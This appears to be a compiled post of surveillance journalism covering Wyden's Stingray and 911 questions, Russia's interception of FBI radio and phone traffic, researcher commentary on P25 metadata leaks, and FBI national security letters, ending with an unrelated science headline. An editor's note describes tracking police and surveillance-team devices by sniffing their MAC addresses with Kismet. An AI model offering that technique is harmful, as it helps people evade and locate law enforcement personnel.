Ron Wyden's staff technologist, Chris Soghoian (formerly of the ACLU), will be fielding answers from the DOJ and FBI about 911 service disruptions, if those answers ever arrive. Wyden's office has sent a letter [PDF] demanding to know the extent of cell service disruption when Stingrays are deployed. And he'd also like to know if these agencies are being honest about the negative side effects when agents seek warrants.
    1. The Communications Act of 1934 prohibits willful or malicious interference with licensed radio communications. How is a federal law enforcement agency's use of a cell-site simulator not authorized by a court order consistent with the prohibition on interference with radio communications in 47 U.S.C. 333?
    2. Is it the position of DOJ that a search warrant authorizing a federal law enforcement agency to use a cell-site simulator overrides the statutory prohibition on interference in 47 U.S.C. 333? If yes, please explain Why.
    3. Does DOJ believe that it has an obligation under the duty of candor to notify federal courts considering an application for the use of a cell-site simulator that federal law prohibits interference with cellular communications? If not, please explain why.
    4. Is it the position of DOJ that it is lawful, with or without a court order, for a federal law enforcement agency to interfere with licensed radio communications such that it disrupts a surveillance target's emergency cellular communications with 9-1-1? If yes, please explain why.
We'll see if Wyden gets his answers. The DOJ still has yet to answer similar questions Wyden asked last year, and there's little reason to believe its response time to questions it doesn't want to answer has improved since 2017.
There is evidence cell site simulators do interfere with 911 service, even if the US government has yet to admit it. A document obtained by the ACLU from the Royal Canadian Mounted Police clearly states cell site simulators have negative effects on emergency calls.
    The MDI [Mobile Device Identifier] will shut itself off if a mobile within its range dials 911. However, recent testing at HQ revealed that more than 50% of the GSM mobile telephones tested had not automatically completed their 911 calls after the MDI had shut itself off.
This memo says the RCMP should inform judges of this possible side effect when seeking warrants and use a 3-minutes-on, 2-minutes-off cycle to minimize cell service disruption and overcollection of cell data from non-targets. If the DOJ has directed the FBI to engage in practices like these, it has yet to make that information public. From what little has been gleaned from public statements and begrudging answers to legislators and Congressional committees, the FBI's use of Stingrays appears to only be constrained by a warrant requirement that is merely the DOJ's internal policy, rather than codified by law.

i haven't seen this brought up before, but Stingray type devices** are also used in extra-judicial "disruption strategies", where a target's communications are denied and interfered with.
See also:
Disruption strategies are to be implemented, according to the guidance document, when sufficient evidence is lacking that someone is a threat; when agents do not have the grounds to continue an actual investigation according to internal guidelines; and when there is no way to bring formal criminal charges against an individual.
According to the FBI's own internal guidelines in Section IV(V), a “Disruption Strategy” may be implemented when the investigation has closed, when the threat is over, and essentially, when there are no more legal, investigatory or constitutional means of continuing the investigation.
Disruption, then, seems to be a last resort used when the FBI's investigations lead to a dead-end. And it is a strategy to be deployed even when there is no threat.
Requests, orders, configuration requirements, technical manuals and any other responsive materials regarding "lawful intercept" of cellular communications, specifically LTE, CDMA, or GSM communications, requesting specific service levels during intercept, including "baud rate match" terminology, "channel rate match", "CBR-channel", "Fixed-bandwidth channel", and "Constant rate channel" terms indicating override of default network operator capacity provisioning during content collection. Specific requested rates or channel capacities include "0.5G", "1/2G", "half-G", "1.5G", "GPRS", "1xRTT", or "SMS-Only" service capacities. Records requested under any authority in scope of this request - focus is on technology rather than statutory authorization enabling collection.

Exclusive: Russia carried out a 'stunning' breach of FBI communications system, escalating the spy game on U.S. soil
Zach Dorfman, Jenna McLaughlin and Sean D. NaylorReporters, Yahoo News•September 16, 2019
On Dec. 29, 2016, the Obama administration announced that it was giving nearly three dozen Russian diplomats just 72 hours to leave the United States and was seizing two rural East Coast estates owned by the Russian government. As the Russians burned papers and scrambled to pack their bags, the Kremlin protested the treatment of its diplomats, and denied that those compounds — sometimes known as the “dachas” — were anything more than vacation spots for their personnel.
The Obama administration’s public rationale for the expulsions and closures — the harshest U.S. diplomatic reprisals taken against Russia in several decades — was to retaliate for Russian meddling in the 2016 presidential election. But there was another critical, and secret, reason why those locations and diplomats were targeted.
Both compounds, and at least some of the expelled diplomats, played key roles in a brazen Russian counterintelligence operation that stretched from the Bay Area to the heart of the nation’s capital, according to former U.S. officials. The operation, which targeted FBI communications, hampered the bureau’s ability to track Russian spies on U.S. soil at a time of increasing tension with Moscow, forced the FBI and CIA to cease contact with some of their Russian assets, and prompted tighter security procedures at key U.S. national security facilities in the Washington area and elsewhere, according to former U.S. officials. It even raised concerns among some U.S. officials about a Russian mole within the U.S. intelligence community.
“It was a very broad effort to try and penetrate our most sensitive operations,” said a former senior CIA official.
American officials discovered that the Russians had dramatically improved their ability to decrypt certain types of secure communications and had successfully tracked devices used by elite FBI surveillance teams. Officials also feared that the Russians may have devised other ways to monitor U.S. intelligence communications, including hacking into computers not connected to the internet. Senior FBI and CIA officials briefed congressional leaders on these issues as part of a wide-ranging examination on Capitol Hill of U.S. counterintelligence vulnerabilities.
These compromises, the full gravity of which became clear to U.S. officials in 2012, gave Russian spies in American cities including Washington, New York and San Francisco key insights into the location of undercover FBI surveillance teams, and likely the actual substance of FBI communications, according to former officials. They provided the Russians opportunities to potentially shake off FBI surveillance and communicate with sensitive human sources, check on remote recording devices and even gather intelligence on their FBI pursuers, the former officials said.
“When we found out about this, the light bulb went on — that this could be why we haven’t seen [certain types of] activity” from known Russian spies in the United States, said a former senior intelligence official.
The compromise of FBI systems occurred not long after the White House’s 2010 decision to arrest and expose a group of “illegals” – Russian operatives embedded in American society under deep non-official cover – and reflected a resurgence of Russian espionage. Just a few months after the illegals pleaded guilty in July 2010, the FBI opened a new investigation into a group of New York-based undercover Russian intelligence officers. These Russian spies, the FBI discovered, were attempting to recruit a ring of U.S. assets — including Carter Page, an American businessman who would later act as an unpaid foreign policy adviser to Donald Trump’s 2016 presidential campaign.
The breaches also spoke to larger challenges faced by U.S. intelligence agencies in guarding the nation’s secrets, an issue highlighted by recent revelations, first published by CNN, that the CIA was forced to extract a key Russian asset and bring him to the U.S. in 2017. The asset was reportedly critical to the U.S. intelligence community’s conclusion that Russian President Vladimir Putin had personally directed the interference in the 2016 presidential election in support of Donald Trump.
Yahoo spoke about these previously unreported technical breaches and the larger government debates surrounding U.S. policies toward Russia with more than 50 current and former intelligence and national security officials, most of whom requested anonymity to discuss sensitive operations and internal discussions. While the officials expressed a variety of views on what went wrong with U.S.-Russian relations, some said the United States at times neglected to appreciate the espionage challenge from Moscow, and paid a significant price for a failure to prioritize technical threats.
“When I was in office, the counterintelligence business was … focused entirely on its core concern, which is insider threats, and in particular mole hunting,” said Joel Brenner, the head of U.S. counterintelligence and strategy from 2006 to 2009. “This is, in fact, the core risk and it’s right that it should be the focus. But we were neither organized nor resourced to deal with counterintelligence in networks, technical networks, electronic networks.”
The discovery of Russia’s newfound capacity to crack certain types of encryption was particularly unnerving, according to former U.S. officials.
“Anytime you find out that an adversary has these capabilities, it sets off a ripple effect,” said a former senior national security official. “The Russians are able to extract every capability from any given technology. ... They are singularly dangerous in this area.”
The FBI’s discovery of these compromises took place on the heels of what many hoped would be a breakthrough between Washington and Moscow — the Obama administration’s 2009 “reset” initiative, which sought to improve U.S.-Russia relations. Despite what seemed to be some initial progress, the reset soon went awry.
In September 2011, Vladimir Putin announced the launch of his third presidential campaign, only to be confronted during the following months by tens of thousands of protesters accusing him of electoral fraud. Putin, a former intelligence officer, publicly accused then-Secretary of State Hillary Clinton of fomenting the unrest.
It was around this time that Putin’s spies in the United States, operating under diplomatic cover, achieved what a former senior intelligence official called a “stunning” technical breakthrough, demonstrating their relentless focus on the country they’ve long considered their primary adversary.
That effort compromised the encrypted radio systems used by the FBI’s mobile surveillance teams, which track the movements of Russian spies on American soil, according to more than half a dozen former senior intelligence and national security officials. Around the same time, Russian spies also compromised the FBI teams’ backup communications systems — cellphones outfitted with “push-to-talk” walkie-talkie capabilities. “This was something we took extremely seriously,” said a former senior counterintelligence official.
The Russian operation went beyond tracking the communications devices used by FBI surveillance teams, according to four former senior officials. Working out of secret “listening posts” housed in Russian diplomatic and other government-controlled facilities, the Russians were able to intercept, record and eventually crack the codes to FBI radio communications.
Some of the clandestine eavesdropping annexes were staffed by the wives of Russian intelligence officers, said a former senior intelligence official. That operation was part of a larger sustained, deliberate Russian campaign targeting secret U.S. government communications throughout the United States, according to former officials.
The two Russian government compounds in Maryland and New York closed in 2016 played a role in the operation, according to three former officials. They were “basically being used as signals intelligence facilities,” said one former senior national security official.
Russian spies also deployed “mobile listening posts.” Some Russian intelligence officers, carrying signals intelligence gear, would walk near FBI surveillance teams. Others drove vans full of listening equipment aimed at intercepting FBI teams’ communications. For the Russians, the operation was “amazingly low risk in an angering way,” said a former senior intelligence official.
The FBI teams were using relatively lightweight radios with limited range, according to former officials. These low-tech devices allowed the teams to move quickly and discreetly while tracking their targets, which would have been more difficult with clunkier but more secure technology, a former official said. But the outdated radios left the teams’ communications vulnerable to the Russians. “The amount of security you employ is the inverse of being able to do things with flexibility, agility and at scale,” said the former official.
A former senior counterintelligence official blamed the compromises on a “hodgepodge of systems” ineffective beyond the line of sight. “The infrastructure that was supposed to be built, they never followed up, or gave us the money for it,” said the former official. “The intelligence community has never gotten an integrated system.”
The limitations of the radio technology, said the former senior officials, led the FBI’s surveillance personnel to communicate on the backup systems.
“Eventually they switched to push-to-talk cellphones,” said a former counterintelligence executive. “The tech guys would get upset by that, because if they could intercept radio, they might be able to intercept telephones.”
That is indeed what happened. Those devices were then identified and compromised by Russian intelligence operatives. (A number of other countries’ surveillance teams — including those from hostile services — also transitioned from using radios to cellphones during this time, noted another former official.)
U.S. intelligence officials were uncertain whether the Russians were able to unscramble the FBI conversations in real time. But even the ability to decrypt them later would have given the Russians critical insights into FBI surveillance practices, including “call signs and locations, team composition and tactics,” said a former intelligence official.
U.S. officials were also unsure about how long the Russians had been able to decipher FBI communications before the bureau realized what was happening. “There was a gap between when they were really onto us, and when we got onto them,” said a former senior intelligence official.
Even after they understood that the Russians had compromised the FBI teams’ radios, U.S. counterintelligence officials could not agree on how they had done it. “The intel reporting was they did break our codes or got their hands on a radio and figured it out,” said a former senior intelligence official. “Either way, they decrypted our comms.”
Officials also cautioned, however, that the Russians could only crack moderately encrypted communications, not the strongest types of encryption used by the U.S. government for its most sensitive transmissions. It was nonetheless “an incredible intelligence success” for the Russians, said the former senior official.
While the Russians may have developed this capability by themselves, senior counterintelligence officials also feared that someone from within the U.S. government — a Russian mole — may have helped them, said former officials. “You’re wondering, ‘If this is true, and they can do this, is this because someone on the inside has given them that information?’’ said another former senior intelligence official.
Russia has a clear interest in concealing how it gets its information, further muddying the waters. According to a former senior CIA officer who served in Moscow, the Russians would often try to disguise a human source as a technical penetration. Ultimately, officials were unable to pinpoint exactly how the Russians pulled off the compromise of the FBI’s systems.
Mark Kelton, who served as the chief of counterintelligence at the CIA until he retired in 2015, declined to discuss specific Russian operations, but he told Yahoo News that “the Russians are a professionally proficient adversary who have historically penetrated every American institution worth penetrating.”
This remains a core worry for U.S. spy hunters. The number of ongoing espionage investigations into U.S. government personnel — at the CIA, the FBI and elsewhere — including those potentially recruited by Russia, “is not a little, it’s a lot,” said another former senior counterintelligence official.
Once the compromises of FBI communications devices were confirmed, U.S. officials scrambled to minimize the exposure of mobile surveillance team operations, quickly putting countermeasures in place, according to former senior officials. There was a “huge concern” about protecting the identities of the individuals on the teams — an elite, secret group — said the former senior counterintelligence official. U.S. officials also conducted a damage assessment and repeatedly briefed select White House officials and members of Congress about the compromise.
After the FBI discovered that its surveillance teams’ cellphones had been compromised, they were forced to switch back to encrypted radios, purchasing different models, according to two former officials. “It was an expensive venture,” said one former counterintelligence official.
But the spying successes went both ways. The U.S. intelligence community collected its own inside information to conclude that the damage from the compromises had been limited, partly due to the Russians’ efforts to keep their intelligence coup secret, according to a former senior intelligence official. “The Russians were reticent to take steps [that might reveal] that they’d figured it out,” the former senior official said.
Even so, the costs to U.S. intelligence were significant. Spooked by the discovery that its surveillance teams’ communications had been compromised, the FBI worried that some of its assets had been blown, said two former senior intelligence officials. The bureau consequently cut off contact with some of its Russian sources, according to one of those officials.
At the time of the compromise, some of the FBI’s other Russian assets stopped cooperating with their American handlers. “There were a couple instances where a recruited person had said, ‘I can’t meet you anymore,’” said a former senior intelligence official. In a damage assessment conducted around 2012, U.S. intelligence officials concluded the events may have been linked.
The impact was not limited to the FBI. Alerted by the bureau to concerns surrounding Russia’s enhanced interception capabilities, the CIA also ceased certain types of communications with sources abroad, according to a former senior CIA official. The agency “had to resort to a whole series of steps” to ensure the Russians weren’t able to eavesdrop on CIA communications, the former senior official said. There was a “strong hint” that these newly discovered code-breaking capabilities by Russia were also being used abroad, said another former senior intelligence official.
The CIA has long been wary of Russian spies’ eavesdropping efforts outside of the United States, especially near U.S. diplomatic facilities. U.S. officials have observed Russian technical officers repeatedly walking close to those compounds with packages in their hands, or wearing backpacks, or pushing strollers, or driving by in vehicles — all attempts, U.S. officials believe, to collect information on the different signals emanating from the facilities. While the tools used by the Russians for these activities were “a bit antiquated,” said a former senior CIA official, they were still a “constant concern.”
It’s not unusual for intelligence officers operating from diplomatic facilities, including the United States’s own operatives, to try and intercept the communications of the host nation. “You had to find ways to attack their surveillance,” said Rolf Mowatt-Larssen, former head of counterintelligence at the Department of Energy and a former CIA officer who first served in Moscow in the 1980s. “The Russians do everything in the U.S. that we did in Moscow.”
Indeed, the focus on cracking radio communications was no different.
“We put extraordinary effort into intercepting and monitoring the FSB surveillance radio networks for the purpose of understanding whether our officers were under surveillance or not,” said another former senior CIA officer who also served in Moscow.
The discovery of the Russians’ new code-breaking capabilities came at a time when gathering intelligence on Russia and its leaders’ intentions was of particular importance to the U.S. government. U.S. national security officials working on Russia at the time received rigorous security training on how to keep their digital devices secure, according to two former senior officials. One former U.S. official recalled how during the negotiations surrounding the reset, NSC officials, partially tongue in cheek, “would sometimes say things on the phone hoping [they] were communicating things to the Russians.”
According to a former CIA official and a former national security official, the CIA’s analysts often disagreed about how committed Russia was to negotiations during the attempted reset and how far Putin would go to achieve his strategic aims, divergences that confused the White House and senior policy makers.
“It caused a really big rift within the [National Security Council] on how seriously they took analysis from the agency,” said the former CIA official. Senior administration leaders “went along with” some of the more optimistic analysis on the future of U.S.-Russia relations “in the hopes that this would work out,” the official continued.
Those disagreements were part of a “reset hangover” that persisted, at least for some inside the administration, until the 2016 election meddling, according to a former senior national security official. Those officials clung to the hope that Washington and Moscow could cooperate on key issues, despite aggressive Russian actions ranging from the invasion of Ukraine to its spying efforts.
“We didn’t understand that they were at political war with us already in the second term once Putin was reelected and Obama himself was reelected,” said Evelyn Farkas, the former deputy assistant secretary of defense for Russia, Ukraine, and Eurasia during the Obama administration.
As high-level hopes for the U.S.-Russia “reset” withered, concerns about the threat of Russian spying made their way to Capitol Hill. Top officials at the FBI and CIA briefed key members of Congress on counterintelligence issues related to Russia, according to current and former U.S. officials. These included briefings on the radio compromises, said two former senior officials.
Mike Rogers, a former Republican lawmaker from Michigan who chaired the House Permanent Select Committee on Intelligence from 2011 to 2015, alluded to counterintelligence concerns at a conference earlier this year in Washington, D.C.
One of those concerns was a massive intelligence failure related to the secret internet-based communications system the CIA used to communicate with agents. The extent of that failure, first reported publicly by Yahoo News in 2018, got the attention of Congress earlier.
But the problems were broader than that issue, according to Rogers.
“Our counterintelligence operations needed some adjustments,” said Rogers, adding that he and his Democratic counterpart from Maryland, Dutch Ruppersberger, requested regular briefings on the subject from agency representatives. “We started out monthly until we just wore them out, then we did it quarterly to try to make sure that we had the right resources and the right focus for the entire community on counter[intelligence].”
Rogers later told Yahoo News that his request for the briefings had been prompted by “suspected penetrations, both physical and technical, which is the role of those [Russian and Chinese] intelligence services,” but declined to be more specific.
The former committee chairman said he wanted the intelligence community to make counterintelligence a higher priority. “Counterintelligence was always looked at as the crazy uncle at the party,” he said. “I wanted to raise it up and give it a robust importance.”
The briefings, which primarily involved counterintelligence officials from the FBI and CIA and were limited to the committee leadership and staff directors, led to “some useful inquiries to help focus the intelligence community,” Rogers said. The leaders of the Senate Select Committee on Intelligence were also included in some of the inquiries, according to Rogers and a current U.S. government official.
Spokespeople for the current House and Senate intelligence committees did not respond to a request for comment. The FBI and CIA declined to comment. The Russian Embassy in Washington, D.C. did not respond to a request for comment.
The briefings were designed to “get the counterintelligence house in order,” said Jamil Jaffer, senior counsel at the House intelligence committee from 2011 to 2013, and to ensure that Congress and the intelligence agencies were “on the same page” when it came to such matters. “There were some concerns about what the agencies were doing, there were some concerns about what Congress knew, and all of these issues, of course, had China-Russia implications.”
Rogers and Jaffer declined to provide further details about what specific counterintelligence issues the committee was addressing, but other former officials indicated that worries weren’t limited to the compromise of FBI radio systems. Senior U.S. officials were contemplating an even more disturbing possibility: that the Russians had found a way to penetrate the communications of the U.S. intelligence community’s most sensitive buildings in and around Washington, D.C.
Suspected Russian intelligence officers were seen conspicuously loitering along the road that runs alongside the CIA’s headquarters, according to former senior intelligence officials. “Russian diplomats would be sitting on Route 123, sometimes in cars with diplomatic plates, other times not,” a former senior intelligence executive said. “We thought, they’re out doing something. It’s not just taking down license plates; those guys are interrogating the system.”
Though this behavior dated back at least to the mid-2000s, former officials said those activities persisted simultaneously with the compromise of the FBI’s communication system. And these were not the only instances of Russian intelligence operatives staking out locations with a line of sight to CIA headquarters. They were “fixated on being in neighborhoods” that gave them exposure to Langley, said a former senior official.
Over time, U.S. intelligence officials became increasingly concerned that Russian spies might be attempting to intercept communications from key U.S. intelligence facilities, including the CIA and FBI headquarters. No one knew if the Russians had actually succeeded.
“The question was whether they had capabilities to penetrate our comms at Langley,” said a former senior CIA official. In the absence of any proof that that was the case, the working theory was that the Russian activities were provocations designed to sow uncertainty within the CIA. “We came to the conclusion that they were trying to get into our heads,” the former senior official said.
A major concern was that Russian spies with physical proximity to sensitive U.S. buildings might be exfiltrating pilfered data that had “jumped the air gap,” i.e., that the Russians were collecting information from a breach of computers not connected to the Internet, said former officials.
One factor behind U.S. intelligence officials’ fears was simple: The CIA had already figured out how to perform similar operations themselves, according to a former senior CIA officer directly familiar with the matter. “We felt it was pretty revolutionary stuff at the time,” the former CIA officer said. “It allowed us to do some extraordinary things.”
While no one definitively concluded that the Russians had actually succeeded in penetrating Langley’s communications, those fears, combined in part with the breach of the bureau’s encrypted radio system, drove an effort by U.S. intelligence officials around 2012 to fortify sensitive Washington-area government buildings against potential Russian snooping, according to four former officials.
At key government facilities in the Washington area, entire floors were converted to sensitive compartmented information facilities, or SCIFs. These are specially protected areas designed to be impenetrable to hostile signals intelligence gathering.
The normal assumption was that work done in a SCIF would be secure, but doubts arose about the safety of even those rooms. “The security guys would say, your windows are ‘tempested’”—that is, protected against the interception of emissions radiating from electronic equipment in the building —“you’re in a SCIF, it’s fine,” a former senior counterintelligence executive recalled. “The question was, ‘Is it true?’”
Increasingly, U.S. officials began to fear it was not.
New security practices were instituted in sensitive government facilities like the FBI and CIA headquarters, according to former officials. “It required many procedural changes on our part to make sure we were not susceptible to penetrations,” said a former senior CIA official. These included basic steps such as moving communication away from windows and changing encryption codes more frequently, as well as more expensive adjustments, said four former officials.
Revelations about the Russian compromise of the radio systems, recalled a former senior intelligence official, “kick-started the money flowing” to upgrade security.
While the breaches of the FBI communications systems appeared to finally spur Congress and the intelligence agencies to adopt steps to counter increasingly sophisticated Russian eavesdropping, it took the Putin-directed interference in the 2016 election to get the White House to expel at least some of those officials deemed responsible for the breaches, and to shut down the facilities that enabled them.
Even then, the decision was controversial. Some in Washington worried about retribution by the Russians and exposure of American intelligence operations, according to a former senior U.S. national security official directly involved in the discussions. The FBI consistently supported expulsions, said another former national security official.
More than two years later, the Russian diplomatic compounds used in the FBI communications compromises remain shuttered. The U.S. government has prevented many of the Russian spies expelled by the United States from returning, according to national security experts and senior foreign intelligence officials. “They are slowly creeping back in, but [the] FBI makes it hard,” said a senior foreign intelligence official. “The old guard is basically screwed. They need to bring in a whole new generation.”
In the meantime, those familiar with Russian operations warn that the threat from Moscow is far from over. “Make no mistake, we’re in an intelligence war with the Russians, every bit as dangerous as the Cold War,” said a former senior intelligence officer. “They’re trying all the time ... and we caught them from time to time,” he said. Of course, he added, “you don’t know what you don’t know.”
That’s the same message that special counsel Robert Mueller tried to convey during the highly contentious hearings to discuss his report on Russian interference in the 2016 election. “They are doing it as we sit here, and they expect to do it during the next campaign,” Mueller told lawmakers on the House Intelligence Committee about covert Russian involvement in U.S. politics.
But a number of observers believe Mueller’s message about the threat from Russia was largely lost amid a partisan battle on Capitol Hill over President Trump.
During his Washington conference appearance earlier this year, Rogers, the former chair of the House Intelligence Committee, also lamented that the current politicized state of the intelligence committees would make spy agencies more hesitant to admit their failures.
“They're not going to call you to say, 'I screwed up.' They're going to say, 'God, I hope they don't find that,’” he said. “That's what's going to happen. I'll guarantee it's happening today.”

Russian spies in the U.S. collected encrypted FBI radio traffic in huge operation, but did they crack it?
There may not have cracked the codes, but Russian agents gained insight into the activities of secret FBI teams tracking Russian operatives in the U.S.
Sept. 16, 2019, 7:54 PM UTC
By Ken Dilanian and Tom Winter
WASHINGTON — Russian spies in the U.S. conducted a massive operation to track and collect encrypted FBI radio traffic, but there is no evidence they ever cracked the codes and obtained the contents of the communications, two former senior FBI officials tell NBC News.
Nonetheless, the [Russian intelligence]( success, [first reported by Yahoo News]( provided Vladimir Putin's government unprecedented insights into the activities of secret FBI surveillance teams tracking Russian operatives in the U.S., the former officials said. The breach occurred sometime around 2010, and was well understood by 2012, the former officials said.
Much of the message traffic [the Russians]( collected was processed in two Russian diplomatic facilities that the Obama administration closed in 2016, citing Russia's interference in the presidential election.
"We knew that they were on to us in terms of radio traffic," one former senior official told NBC News. "They had a huge effort they threw at it. But we never saw content."
Yahoo News cited former officials who said the Russians had access to "likely the actual substance of FBI communications," but the two former officials told NBC News they did not believe that to be true. The two former senior officials said they had seen nothing to suggest Russia successfully decoded encrypted U.S. government communications. Rather, the Russians were able to detect and locate secret FBI radio transmissions, they said.
"What they saw was traffic around certain meetings with people who were talking to them," one former official said.
In some cases, the insights the Russians gleaned from the location and movements of FBI surveillance teams led them to stop meeting with sources in the U.S. the former official said.
The former official added that the FBI and CIA learned of the Russian success through some espionage successes of their own, which he declined to detail.
The Russian operation came at a time when the U.S. was developing its own capability to identify covert Russian communications. From March through May of 2010, FBI agents in New York were able to detect specialized encrypted communications sent from the laptop of a Russian spy, [Anna Chapman]( to a minivan driven by a Russian government official, according to her indictment.
Chapman was arrested along with nine other Russians, who were accused of acting as a network of sleeper agents sent to live in the U.S. under non-official cover. They were deported to Russia in a spy swap.
It was long known that the Russians were using their diplomatic compounds in Maryland and New York as listening posts, which is why the Obama administration seized them in December 2016, officials said. But the CIA and FBI also learned that wives of Russian diplomats were working in the facilities to process FBI radio traffic, said the former senior official, who had direct knowledge of the matter.
The news of the Russian success comes after revelations that the CIA's method of communicating with its informants had been compromised.
NBC News and other organizations reported in 2018 that a secret FBI–CIA task force investigating the case of[an American CIA officer spying for China]( concluded that the Chinese government penetrated the CIA's method of clandestine communication with its spies, using that knowledge to arrest and execute at least 20 CIA informants, according to multiple current and former government officials.
[Yahoo News then reported]( in November that Iran also had cracked the CIA's covert communications system, resulting in a cascading crisis that put at risk foreigners around the world who had been recruited by the American spy agency to provide information.
Both of these matters are known to the Congressional oversight committees, officials tell NBC News, but since they are classified, there has been no public accountability.

Thinking about the FBI CI comms / Russia story some more (and chatting with some folks), I think most (but not all) of both the radio compromise and the PTT phone app compromise can be explained by systematic exploitation of known vulnerabilities.
For the radio stuff, we found (and published in 2011) attacks against P25 encrypted communication that exploit the ways the protocol aggressively leaks metadata. See [ …]( Our paper does not explain how to recover encrypted voice traffic, however.
Key management in P25 is a mess, and I would be unsurprised if there were attacks against things like the key generation scheme used in, say, Motorola's key-loaders. But I don't know of any specific weaknesses here.
For the phone app attacks, remember that smartphone handsets leak all sorts of unencrypted metadata - IMSI on the cellular network, but also wifi and bluetooth MAC addresses. Systematically collecting this is easy and would identify agents following you over time.
Once identified, this metadata also provides useful information for targeting those handsets with more active attacks (at some risk of alerting them, but that's a typical tradeoff in intelligence).
Basically, systematic application of well known techniques (well within reach of a university, let alone a state actor) is sufficient to explain the traffic analysis of both the FBI's radios and its smartphone PTT app. Encrypted voice recovery is left as an exercise to the TLA.
BTW, a sub-scoop in the Yahoo story was the existence of the FBI PTT app, which I've never seen any public reference to. (It basically replaces the old Nextel system, which the FBI and other fed LE were heavy users of).
Anyway, the key difference between the Russians and some nerd with a scanner here isn't so much budget or tech ability, but willingness and motivation to be extremely systematic in what's collected and analyzed.
ED. Note: back in late oughts I used this trick as super charged radar detector. the police in Beaverton / Hillsboro had a citywide wireless network setup with VPN, but you could see all the MAC's (BSSIDs) associated with the cruisers, the photo radar vans, the surveillance teams. if a cop joined their phone to the police network, you could then track that phone's MAC (BSSID) as known police device. you'd watch for VPN traffic (IPsec ESP or AH) to identify actual clients vs. just random connect by strangers. a directional antenna across from the police dept. sniffed 24/7/365...
set a custom alert in Kismet by MAC, then you're good to go! detect them before you see them, even if the radar is off :P

Secret F.B.I. Subpoenas Scoop Up Personal Data From Scores of Companies

By [Jennifer Valentino-DeVries](
Sept. 20, 2019Updated 3:47 p.m. ET
The F.B.I. has used secret subpoenas to obtain personal data from far more companies than previously disclosed, newly released [documents]( show.
The requests, which the F.B.I. says are critical to its counterterrorism efforts, have raised privacy concerns for years but have been associated mainly with tech companies. Now, records show how far beyond Silicon Valley the practice extends — encompassing scores of banks, credit agencies, cellphone carriers and even universities.
The demands can scoop up a variety of information, including usernames, locations, IP addresses and records of purchases. They don’t require a judge’s approval and usually come with a gag order, leaving them shrouded in secrecy. Fewer than 20 entities, most of them tech companies, have ever revealed that they’ve received the subpoenas, known as national security letters.
The documents, obtained by the Electronic Frontier Foundation through a Freedom of Information Act [lawsuit]( and shared with The New York Times, shed light on the scope of the demands — more than 120 companies and other entities were included in the filing — and raise questions about the effectiveness of a 2015 law that was intended to increase transparency around them.
“This is a pretty potent authority for the government,” said Stephen Vladeck, a law professor at the University of Texas who specializes in national security. “The question is: Do we have a right to know when the government is collecting information on us?”
The documents provide information on about 750 of the subpoenas — representing a small but telling fraction of the half-million issued since 2001, when the Patriot Act expanded their powers.
The credit agencies Equifax, Experian and TransUnion received a large number of the letters in the filing. So did financial institutions like Bank of America, Western Union and even the Federal Reserve Bank of New York. All declined to explain how they handle the letters. An array of other entities received smaller numbers of requests — including Kansas State University and the University of Alabama at Birmingham, probably because of their role in providing internet service.
Other companies included major cellular providers such as AT&T and Verizon, as well as tech giants like Google and Facebook, which have [acknowledged]( [receiving]( [the letters]( in the past.
Albert Gidari, a lawyer who long represented tech and telecommunications companies and is now the privacy director at Stanford’s Center for Internet and Society, said Silicon Valley had been associated with the subpoenas because it was more willing than other industries to fight the gag orders. “Telecoms and financial institutions get little attention,” he said, even though the law specifically says they are fair game.
The Federal Bureau of Investigation determined that information on the roughly 750 letters could be disclosed under a 2015 law, the USA Freedom Act, that requires the government to review the secrecy orders “at appropriate intervals.”
The Justice Department’s interpretation of those instructions has left many letters secret indefinitely. Department [guidelines]( say the gag orders must be evaluated three years after an investigation starts and also when an investigation is closed. But [a federal judge]( [noted]( “several large loopholes,” suggesting that “a large swath” of gag orders might never be reviewed.
According to the new documents, the F.B.I. evaluated 11,874 orders between early 2016, when the rules went into effect, and September 2017, when the Electronic Frontier Foundation, a digital rights group, requested the information.
“We are not sure the F.B.I. is taking its obligations under USA Freedom seriously,” said Andrew Crocker, a lawyer with the foundation. “There still is a huge problem with permanent gag orders.”

The Justice Department declined to comment.
National security letters, which the F.B.I. has issued since the 1980s, have long been a point of contention in the debate over privacy and security. Initially, the bureau had to show “specific and articulable facts” indicating that the target was an agent of a foreign power. Now, the F.B.I. must certify that the information is “relevant” to a terrorism, counterintelligence or leak investigation.
“NSLs are an indispensable investigative tool,” the Justice Department argued in the Freedom of Information Act case. The department has said in [legal documents]( that the information gleaned from the letters is important to identifying subjects and their associates, while helping to clear the innocent of suspicion.
According to [a 2007 report]( from the Justice Department inspector general, the F.B.I. didn’t track how often information from the letters was used in criminal proceedings. But the report also said the letters had led to guilty pleas for arms trading, at least one conviction for material support of terrorism, and multiple charges of fraud and money laundering. The tool was [also cited]( in efforts to investigate Russian meddling in the 2016 election.
Much of the concern about the letters has focused on the gag orders, which accompany nearly every request and prevent the recipient — typically indefinitely — from disclosing even the existence of the letter. The federal government has argued that the secrecy is necessary to avoid alerting targets, giving would-be terrorists clues about how the government conducts its surveillance or hurting diplomatic relations.
After a series of court rulings found that the gag orders violated First Amendment protections, Congress enacted the review requirements.
The documents obtained through the lawsuit include the number of orders reviewed, as well as redacted copies of 751 letters from the F.B.I. informing companies and organizations their gag orders had been lifted. These so-called termination letters do not reveal the contents of the original national security letters, but indicate which entities received them.
Because so few gag orders have been reviewed and rescinded, it isn’t possible to say whether the companies that received the most termination letters also received the most national security letters. But given the overall secrecy around the program, the termination letters offer a rare glimpse into these subpoenas.
Equifax, Experian and AT&T received the most termination letters: more than 50 each. TransUnion, T-Mobile and Verizon each received more than 40. Yahoo, Google and [Microsoft]( got more than 20 apiece. Over 60 companies received just one.
The underlying national security letters were not included in the documents, and it is unclear when most of them were issued and who the individual targets were.
Tech companies have disclosed more information about the letters they received than the major phone providers, which included general information about them in transparency reports.
“We have fought for the right to be transparent about our receipt” of national security letters, Richard Salgado, Google’s director of law enforcement and information security, said in a [2016 statement]( explaining why the company was releasing [the subpoenas]( “Our goal in doing so is to shed more light on the nature and scope” of the requests, he added.
Other companies have generally remained mum. In response to inquiries, a TransUnion spokesman would say only that the company “has not disclosed the receipt of any national security letters.” A spokesman for Equifax said it was “compliant with the national security letters process.”
Mr. Gidari, the former tech lawyer, attributed some of that lack of reporting to differences in company culture, noting that tech firms were more predisposed to openness, and financial institutions less likely to discuss any outside access to customer data. And most small companies, he said, don’t have the resources to keep long-term track of or challenge the subpoenas.
“That’s the problem with the Freedom Act: It procedurally pretended to solve the problem,” he said. “But the whole structure of this involves presumption in favor of the government for perpetual sealing.”

An important quantum algorithm may actually be a property of nature
Evidence that quantum searches are an ordinary feature of electron behavior may explain the genetic code, one of the greatest puzzles in biology.
